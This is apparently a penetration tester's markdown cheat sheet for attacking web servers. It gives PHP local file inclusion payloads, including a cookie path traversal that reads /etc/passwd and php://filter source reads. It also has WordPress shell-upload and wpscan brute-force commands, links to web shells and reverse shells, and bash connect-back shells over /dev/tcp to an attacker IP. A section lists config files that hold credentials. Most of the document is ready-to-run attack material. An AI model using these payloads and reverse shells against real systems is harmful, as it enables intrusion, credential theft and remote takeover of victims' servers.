# HTTP / HTTPS



* CHECK if the port hosts http/s:
  `# amap [ip address] [port]`


#### PHP
 * PHP local file inclusion
    - See [here](https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/) for many examples.
    -   "In versions of PHP below 5.3, we would be able to terminate our request with a null byte (%00) that would cause the PHP engine to ignore everything after that byte."

* LFI Cheatsheet [here](https://highon.coffee/blog/lfi-cheat-sheet/)
    https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/
    https://cyb3rninjas.blogspot.com/2015/03/lfi-exploitation-via-phpinput.html

* Read the source of a PHP file
  - Sometimes site seems vulnerable to LFI, but no NULL byte injection and only .php or similar.
  - Try to [read the source of the file](https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/)

  ```
  $ curl http://xqi.cc/index.php?m=php://filter/convert.base64-encode/resource=index
  PD9waHAgZWNobygkX0dFVFsneCddKTsgLy8gT01HIHlvdSBib3RoZXJlZCB0byBkZWNvZGUgYmFzZSA2ND8gPz4=

  http://target_ip/?page=php://filter/convert.base64-encode/resource=config
  ```
  - This gives a Base64 string of the file content


* Upload a shell as part of an image:
  https://phocean.net/2013/09/29/file-upload-vulnerabilities-appending-php-code-to-an-image.html

* Include: If the PHP source has `include` set, check for injection!
```php
<?php
//Multilingual. Not implemented yet.
//setcookie("lang","en.lang.php");
if (isset($_COOKIE['lang']))
{
    include("lang/".$_COOKIE['lang']);
}
// Not implemented yet.
?>
```
  Then
  ```
  GET / HTTP/1.0
  Cookie: lang=../../../../etc/passwd

  HTTP/1.1 200 OK
  ...
  root:x:0:0:root/root:/bin/bash
  daemmon...
  ```
---

#### IIS 6.0 / WebDAV

* WebDAV enabled: https://blog.skullsecurity.org/2009/webdav-detection-vulnerability-checking-and-exploitation
 - Can check in msfconsole, or nmap
 `# nmap -Pn -n -sT -p 80 --script=http-iis-webdav-vuln 10.11.1.229`


---
#### WordPress

* Configuration stored in `https://[the_URL]/wp-config.php`

* Check for plugins, themes and uploads in https://[the_URL]/wp-content/

* In wordpress upload your shell using the plugin feature. --> Upload plugin: shell.php  
  https://192.168.213.134:12380/blogblog/wp-content/uploads/shell.php

* We run wpscan and see if we can find any users
  `wpscan --url https://192.168.213.134:12380/blogblog --enumerate u`

* Brute force account login for one user name:
  `wpscan --url https://192.168.213.134:12380/blogblog --wordlist /usr/share/wordlists/rockyou.txt --username john`


### Shells
  - ASP
    http://packetstormsecurity.org/UNIX/penetration/aspxshell.aspx.txt
  - Assorted
    http://michaeldaw.org/projects/web-backdoor-compilation/
    http://open-labs.org/hacker_webkit02.tar.gz
  - Perl
    http://home.arcor.de/mschierlm/test/pmsh.pl
    http://pentestmonkey.net/tools/perl-reverse-shell/
    http://freeworld.thc.org/download.php?t=r&f=rwwwshell-2.0.pl.gz
  - PHP
    http://php.spb.ru/remview/
    http://pentestmonkey.net/tools/php-reverse-shell/
    http://pentestmonkey.net/tools/php-findsock-shell/
  - Python
    http://matahari.sourceforge.net/
  - TCL
    http://www.irmplc.com/download_pdf.php?src=Creating_Backdoors_in_Cisco_IOS_using_Tcl.pdf&force=yes

  - Bash Connect Back Shell
    GnuCitizen
    ```
    Atttack Box: nc -l -p Port -vvv
    Victim: $ exec 5<>/dev/tcp/IP_Address/Port

    Victim: $ cat <&5 | while read line; do $line 2>&5 >&5; done
    ```

    Neohapsis
    ```
    Atttack Box: nc -l -p Port -vvv

    Victim: $ exec 0</dev/tcp/IP_Address/Port # First we copy our connection over stdin
    Victim: $ exec 1>&0 # Next we copy stdin to stdout
    Victim: $ exec 2>&0 # And finally stdin to stderr
    Victim: $ exec /bin/sh 0</dev/tcp/IP_Address/Port 1>&0 2>&0
    ```

### Configuration files

* Examine configuration files
  - **Apache**  
      - Examine `httpd.conf` windows config files

  - Java based apps
  ```
  web.config
  ```
  - **XAMMP** - WebDAV
  ```
  <XAMPP_INSTALLATION_HOME>\apache\conf\extra\httpd-dav.conf
  <XAMPP_INSTALLATION_HOME>\passwd
  c:\\xampp\\security\\webdav.htpasswd
  c:\xampp\passwd
  ```

  - **JBoss**
      - JMX Console `http://<IP>:8080/jmxconcole/`
      - War File
  - **Joomla**
  ```
  configuration.php
  diagnostics.php
  joomla.inc.php
  config.inc.php
  ```
  - **Mambo**
  ```
    configuration.php
    config.inc.php
    ```
  - **Wordpress**
  ```
  setup-config.php
  wp-config.php
  ```
  - **ZyXel**
  ```
  /WAN.html (contains PPPoE ISP password)
  /WLAN_General.html and /WLAN.html (contains WEP key)
  /rpDyDNS.html (contains DDNS credentials)
  /Firewall_DefPolicy.html (Firewall)
  /CF_Keyword.html (Content Filter)
  /RemMagWWW.html (Remote MGMT)
  /rpSysAdmin.html (System)
  /LAN_IP.html (LAN)
  /NAT_General.html (NAT)
  /ViewLog.html (Logs)
  /rpFWUpload.html (Tools)
  /DiagGeneral.html (Diagnostic)
  /RemMagSNMP.html (SNMP Passwords)
  /LAN_ClientList.html (Current DHCP Leases)
  Config Backups
      /RestoreCfg.html
      /BackupCfg.html
      Note: - The above config files are not human readable and the following tool is required to breakout possible admin credentials and other important settings
          ZyXEL Config Reader
  ```
